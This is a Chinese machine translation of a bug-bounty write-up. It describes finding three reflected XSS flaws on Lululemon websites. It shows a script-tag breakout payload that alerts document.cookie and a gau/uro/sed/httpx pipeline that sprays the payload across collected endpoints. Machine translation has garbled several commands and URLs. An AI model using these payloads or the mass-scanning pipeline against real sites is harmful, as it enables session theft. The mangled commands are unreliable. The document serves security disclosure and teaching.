<html>
<head>
<title>How I found 3 RXSS on Lululemon bug bounty program</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我是如何在Lululemon bug赏金程序中找到3个rxs的</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-found-3-rxss-on-the-lululemon-bug-bounty-program-fa357a0154c2?source=collection_archive---------0-----------------------#2022-09-07">https://infosecwriteups.com/how-i-found-3-rxss-on-the-lululemon-bug-bounty-program-fa357a0154c2?source=collection_archive---------0-----------------------#2022-09-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="fde5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好，今天我将向你们展示如何用简单的技术找到整个子域中的多个系列漏洞</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/1bc6b86a2d0d7eca0fb107c01ce575f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ypRzdxcS9zs8NU3X7sf3MQ.png"/></div></div></figure><h2 id="2a3c" class="kx ky iq bd kz la lb dn lc ld le dp lf jy lg lh li kc lj lk ll kg lm ln lo lp bi translated">让我们开始我们的故事</h2><p id="33f6" class="pw-post-body-paragraph jn jo iq jp b jq lq js jt ju lr jw jx jy ls ka kb kc lt ke kf kg lu ki kj kk ij bi translated">当我在Bugcrowd上搜索<a class="ae lv" href="https://bugcrowd.com/lululemon" rel="noopener ugc nofollow" target="_blank"> Lululemon </a>节目时</p><p id="538a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我开始查看主域名<a class="ae lv" href="https://www.lululemon.co.uk" rel="noopener ugc nofollow" target="_blank">https://www.lululemon.co.uk</a></p><p id="3d55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我花了一些时间在主域上之后，我开始使用<a class="ae lv" href="https://github.com/s0md3v/Arjun" rel="noopener ugc nofollow" target="_blank"> Arjun </a>进行参数暴力破解</p><blockquote class="lw lx ly"><p id="413b" class="jn jo lz jp b jq jr js jt ju jv jw jx ma jz ka kb mb kd ke kf mc kh ki kj kk ij bi translated">https://www.lululemon.co.uk/en-uk/search-ot lululemon-parameters</p></blockquote><p id="b9c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出文件如下所示</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi md"><img src="../Images/d600726de339b2b1495800389adfa9b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7meje0oVtMyV27Uixx55pA.png"/></div></div></figure><blockquote class="lw lx ly"><p id="2bd7" class="jn jo lz jp b jq jr js jt ju jv jw jx ma jz ka kb mb kd ke kf mc kh ki kj kk ij bi translated">┌──(omar㉿kali)-[~] <br/> └─$猫lululemon-参数| QS替换奥马尔</p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi me"><img src="../Images/1953c419909dcf8716c8ad13733b8078.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gg5nP-WvfAS3Eg4vX2_sgg.png"/></div></div></figure><p id="9493" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在浏览器中请求链接时发现q参数值反映在脚本标记内的双引号中</p><p id="c550" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mf mg mh mi b">&lt;script&gt;some javascript code;var q="omar"; some javascript code;&lt;/script&gt;</code></p><p id="9be0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着去掉双引号，并像这样在脚本标签中注入我的有效载荷</p><blockquote class="lw lx ly"><p id="57d7" class="jn jo lz jp b jq jr js jt ju jv jw jx ma jz ka kb mb kd ke kf mc kh ki kj kk ij bi translated"><a class="ae lv" href="https://www.lululemon.co.uk" rel="noopener ugc nofollow" target="_blank">https://www.lululemon.co.uk</a>/en-uk/search？q =奥马尔"；警报(域)；//</p></blockquote><p id="fef7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是反射是这样的</p><p id="2a20" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mf mg mh mi b">&lt;script&gt;some javascript code;var q="omar\";alert(domain);//"; some javascript code;&lt;/script&gt;</code></p><p id="1366" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以看起来开发者绕过了引号，以防止攻击者避开双引号，从而不注入恶意代码</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mj mk l"/></div></figure><p id="c941" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开放标签&lt;</p><blockquote class="lw lx ly"><p id="5fb9" class="jn jo lz jp b jq jr js jt ju jv jw jx ma jz ka kb mb kd ke kf mc kh ki kj kk ij bi translated"><a class="ae lv" href="https://www.lululemon.co.uk" rel="noopener ugc nofollow" target="_blank">https://www.lululemon.co.uk</a>/en-uk/search怎么样？q =奥马尔&lt;</p></blockquote><p id="577c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">倒影是这样的</p><p id="6b19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mf mg mh mi b">&lt;script&gt;some javascript code;var q="omar&lt;"; some javascript code;&lt;/script&gt;</code></p><p id="08f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我希望开发人员在后台使用代码来打印q参数的值，就像这样</p><p id="c59b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mf mg mh mi b">&lt;?php echo(addslashes($_GET['q'])) ?&gt;</code></p><p id="e9e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着我们不能使用引号，但我们可以关闭脚本标签，然后打开一个新标签，并在其中编写我们的javascript代码</p><blockquote class="lw lx ly"><p id="ae81" class="jn jo lz jp b jq jr js jt ju jv jw jx ma jz ka kb mb kd ke kf mc kh ki kj kk ij bi translated"><a class="ae lv" href="https://www.lululemon.co.uk" rel="noopener ugc nofollow" target="_blank">https://www.lululemon.co.uk</a>/en-uk/search？q =&lt;/脚本&gt; &lt;脚本&gt;预警(document . cookie)&lt;/脚本&gt;</p></blockquote><h2 id="3f56" class="kx ky iq bd kz la lb dn lc ld le dp lf jy lg lh li kc lj lk ll kg lm ln lo lp bi translated">第一个XSS在:</h2><p id="e14e" class="pw-post-body-paragraph jn jo iq jp b jq lq js jt ju lr jw jx jy ls ka kb kc lt ke kf kg lu ki kj kk ij bi translated"><a class="ae lv" href="https://www.lululemon.co.uk" rel="noopener ugc nofollow" target="_blank">https://www.lululemon.co.uk</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ml"><img src="../Images/94887dedcc6d820a1b8c1dc95b9ae01c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6Ae6lvoQ13LE4Fif5gMHjA.png"/></div></div></figure><p id="15d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通常，当开发人员犯了一个错误时，很有可能会在其他地方犯同样的错误</p><p id="eeed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以下一步是在其他域和子域端点上测试这个XSS</p><h2 id="e071" class="kx ky iq bd kz la lb dn lc ld le dp lf jy lg lh li kc lj lk ll kg lm ln lo lp bi translated">简单侦察:</h2><p id="ec10" class="pw-post-body-paragraph jn jo iq jp b jq lq js jt ju lr jw jx jy ls ka kb kc lt ke kf kg lu ki kj kk ij bi translated">使用<a class="ae lv" href="https://github.com/lc/gau" rel="noopener ugc nofollow" target="_blank"> gau </a>工具被动收集端点，然后使用<a class="ae lv" href="https://github.com/s0md3v/uro" rel="noopener ugc nofollow" target="_blank"> uro </a>工具获得唯一端点，过滤图像、js、css和其他静态文件</p><blockquote class="lw lx ly"><p id="4b99" class="jn jo lz jp b jq jr js jt ju jv jw jx ma jz ka kb mb kd ke kf mc kh ki kj kk ij bi translated">┌──(omar㉿kali)-[~] <br/> └─$猫子域. txt|gau |uro &gt; endpoints.txt</p></blockquote><p id="67c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用sed命令将我们的“q”参数添加到所有端点，并将url编码的有效负载“<script>”alert(document . cookie)</script>”作为值</p><blockquote class="lw lx ly"><p id="e763" class="jn jo lz jp b jq jr js jt ju jv jw jx ma jz ka kb mb kd ke kf mc kh ki kj kk ij bi translated">┌──(omar㉿kali)-[~] <br/> └─$？(.*)|$/\?q = % 3C % 2f script % 3E % 3c script % 3e alert(document . cookie)% 3C % 2f script % 3E/g " endpoints . txt</p></blockquote><p id="8e89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用httpx请求端点，并使用参数-ms匹配我们的有效负载</p><blockquote class="lw lx ly"><p id="264b" class="jn jo lz jp b jq jr js jt ju jv jw jx ma jz ka kb mb kd ke kf mc kh ki kj kk ij bi translated">┌──(omar㉿kali)-[~]<br/>└─$ httpx-l endpoints . txt-ms "&lt;/脚本&gt; &lt;脚本&gt;警报(document . cookie)&lt;/脚本&gt;</p></blockquote><p id="9b1f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就是结果</p><h2 id="0042" class="kx ky iq bd kz la lb dn lc ld le dp lf jy lg lh li kc lj lk ll kg lm ln lo lp bi translated">第二个XSS在:</h2><p id="9750" class="pw-post-body-paragraph jn jo iq jp b jq lq js jt ju lr jw jx jy ls ka kb kc lt ke kf kg lu ki kj kk ij bi translated"><a class="ae lv" href="https://www.lululemon.co.uk" rel="noopener ugc nofollow" target="_blank">https://www.lululemon.co</a>m.hk</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ml"><img src="../Images/16e46a9131d727c67892047ba21d6a08.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*79aKK7KKxNxJbP-42LkBhw.png"/></div></div></figure><h2 id="1c5b" class="kx ky iq bd kz la lb dn lc ld le dp lf jy lg lh li kc lj lk ll kg lm ln lo lp bi translated">第三个XSS在:</h2><p id="3f9b" class="pw-post-body-paragraph jn jo iq jp b jq lq js jt ju lr jw jx jy ls ka kb kc lt ke kf kg lu ki kj kk ij bi translated">https://www.eu.lululemon.co m</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mm"><img src="../Images/941e6663b47432459e104608a09cd83a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K-HuBgDoc6iiUJVI0p5u6A.png"/></div></div></figure><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mn mk l"/></div></figure><h1 id="6825" class="mo ky iq bd kz mp mq mr lc ms mt mu lf mv mw mx li my mz na ll nb nc nd lo ne bi translated"><strong class="ak">保持联系:</strong></h1><p id="0440" class="pw-post-body-paragraph jn jo iq jp b jq lq js jt ju lr jw jx jy ls ka kb kc lt ke kf kg lu ki kj kk ij bi translated"><a class="ae lv" href="https://www.linkedin.com/in/omar-1-hashem" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">LinkedIn</strong></a><strong class="jp ir">|</strong><a class="ae lv" href="https://www.youtube.com/channel/UCJ1yNtgZP5LRO7ebZXSnAZQ/videos" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">Youtube</strong></a><strong class="jp ir">|</strong><a class="ae lv" href="https://twitter.com/OmarHashem666" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">Twitter</strong></a></p></div><div class="ab cl nf ng hu nh" role="separator"><span class="ni bw bk nj nk nl"/><span class="ni bw bk nj nk nl"/><span class="ni bw bk nj nk"/></div><div class="ij ik il im in"><h2 id="467a" class="kx ky iq bd kz la lb dn lc ld le dp lf jy lg lh li kc lj lk ll kg lm ln lo lp bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lv" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>